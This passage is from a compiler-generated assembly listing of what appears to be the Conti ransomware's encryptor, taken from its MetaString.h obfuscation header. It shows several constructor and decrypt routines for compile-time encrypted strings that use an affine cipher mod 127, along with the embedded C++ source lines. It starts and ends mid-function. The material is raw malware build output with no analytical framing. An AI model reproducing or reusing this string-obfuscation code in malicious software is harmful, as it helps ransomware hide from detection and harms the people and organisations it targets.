  0000f	c6 41 04 6d	 mov	 BYTE PTR [rcx+4], 109	; 0000006dH
  00013	c6 41 05 6d	 mov	 BYTE PTR [rcx+5], 109	; 0000006dH
  00017	c6 41 06 4e	 mov	 BYTE PTR [rcx+6], 78	; 0000004eH
  0001b	c6 41 07 49	 mov	 BYTE PTR [rcx+7], 73	; 00000049H
  0001f	c6 41 08 35	 mov	 BYTE PTR [rcx+8], 53	; 00000035H
  00023	c6 41 09 45	 mov	 BYTE PTR [rcx+9], 69	; 00000045H
  00027	c6 41 0a 6d	 mov	 BYTE PTR [rcx+10], 109	; 0000006dH
  0002b	c6 41 0b 6d	 mov	 BYTE PTR [rcx+11], 109	; 0000006dH
  0002f	c6 41 0c 4d	 mov	 BYTE PTR [rcx+12], 77	; 0000004dH
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0c 00 00 00	 mov	 eax, 12
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 40	 lea	 ecx, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 23	 mov	 BYTE PTR [rcx+1], 35	; 00000023H
  00007	c6 41 02 32	 mov	 BYTE PTR [rcx+2], 50	; 00000032H
  0000b	c6 41 03 47	 mov	 BYTE PTR [rcx+3], 71	; 00000047H
  0000f	c6 41 04 61	 mov	 BYTE PTR [rcx+4], 97	; 00000061H
  00013	c6 41 05 2d	 mov	 BYTE PTR [rcx+5], 45	; 0000002dH
  00017	c6 41 06 5c	 mov	 BYTE PTR [rcx+6], 92	; 0000005cH
  0001b	c6 41 07 57	 mov	 BYTE PTR [rcx+7], 87	; 00000057H
  0001f	c6 41 08 3f	 mov	 BYTE PTR [rcx+8], 63	; 0000003fH
  00023	c6 41 09 1d	 mov	 BYTE PTR [rcx+9], 29
  00027	c6 41 0a 47	 mov	 BYTE PTR [rcx+10], 71	; 00000047H
  0002b	c6 41 0b 47	 mov	 BYTE PTR [rcx+11], 71	; 00000047H
  0002f	c6 41 0c 0c	 mov	 BYTE PTR [rcx+12], 12
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0d 00 00
	00		 mov	 r11d, 13
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 11	 sub	 ecx, 17

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 73	 mov	 BYTE PTR [rcx+1], 115	; 00000073H
  00007	c6 41 02 10	 mov	 BYTE PTR [rcx+2], 16
  0000b	c6 41 03 07	 mov	 BYTE PTR [rcx+3], 7
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 10	 mov	 BYTE PTR [rcx+5], 16
  00017	c6 41 06 0f	 mov	 BYTE PTR [rcx+6], 15
  0001b	c6 41 07 10	 mov	 BYTE PTR [rcx+7], 16
  0001f	c6 41 08 18	 mov	 BYTE PTR [rcx+8], 24
  00023	c6 41 09 25	 mov	 BYTE PTR [rcx+9], 37	; 00000025H
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	c6 41 0b 4b	 mov	 BYTE PTR [rcx+11], 75	; 0000004bH
  0002f	c6 41 0c 4b	 mov	 BYTE PTR [rcx+12], 75	; 0000004bH
  00033	c6 41 0d 11	 mov	 BYTE PTR [rcx+13], 17
  00037	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003b	48 8b c1	 mov	 rax, rcx
  0003e	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0d 00 00
	00		 mov	 r10d, 13
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 32 00 00 00	 mov	 eax, 50			; 00000032H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 27	 imul	 ecx, eax, 39		; 00000027H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 30	 mov	 BYTE PTR [rcx+1], 48	; 00000030H
  00007	c6 41 02 5d	 mov	 BYTE PTR [rcx+2], 93	; 0000005dH
  0000b	c6 41 03 22	 mov	 BYTE PTR [rcx+3], 34	; 00000022H
  0000f	c6 41 04 29	 mov	 BYTE PTR [rcx+4], 41	; 00000029H
  00013	c6 41 05 6d	 mov	 BYTE PTR [rcx+5], 109	; 0000006dH
  00017	c6 41 06 12	 mov	 BYTE PTR [rcx+6], 18
  0001b	c6 41 07 4e	 mov	 BYTE PTR [rcx+7], 78	; 0000004eH
  0001f	c6 41 08 41	 mov	 BYTE PTR [rcx+8], 65	; 00000041H
  00023	c6 41 09 0d	 mov	 BYTE PTR [rcx+9], 13
  00027	c6 41 0a 50	 mov	 BYTE PTR [rcx+10], 80	; 00000050H
  0002b	c6 41 0b 39	 mov	 BYTE PTR [rcx+11], 57	; 00000039H
  0002f	c6 41 0c 39	 mov	 BYTE PTR [rcx+12], 57	; 00000039H
  00033	c6 41 0d 32	 mov	 BYTE PTR [rcx+13], 50	; 00000032H
  00037	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003b	48 8b c1	 mov	 rax, rcx
  0003e	c3		 ret	 0
??0?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0d 00 00
	00		 mov	 r10d, 13
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 45 00 00 00	 mov	 eax, 69			; 00000045H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 79	 mov	 BYTE PTR [rcx+1], 121	; 00000079H
  00007	c6 41 02 4f	 mov	 BYTE PTR [rcx+2], 79	; 0000004fH
  0000b	c6 41 03 4c	 mov	 BYTE PTR [rcx+3], 76	; 0000004cH
  0000f	c6 41 04 73	 mov	 BYTE PTR [rcx+4], 115	; 00000073H
  00013	c6 41 05 65	 mov	 BYTE PTR [rcx+5], 101	; 00000065H
  00017	c6 41 06 1c	 mov	 BYTE PTR [rcx+6], 28
  0001b	c6 41 07 6d	 mov	 BYTE PTR [rcx+7], 109	; 0000006dH
  0001f	c6 41 08 24	 mov	 BYTE PTR [rcx+8], 36	; 00000024H
  00023	c6 41 09 7d	 mov	 BYTE PTR [rcx+9], 125	; 0000007dH
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	c6 41 0b 4f	 mov	 BYTE PTR [rcx+11], 79	; 0000004fH
  0002f	c6 41 0c 4f	 mov	 BYTE PTR [rcx+12], 79	; 0000004fH
  00033	c6 41 0d 45	 mov	 BYTE PTR [rcx+13], 69	; 00000045H
  00037	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003b	48 8b c1	 mov	 rax, rcx
  0003e	c3		 ret	 0
??0?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
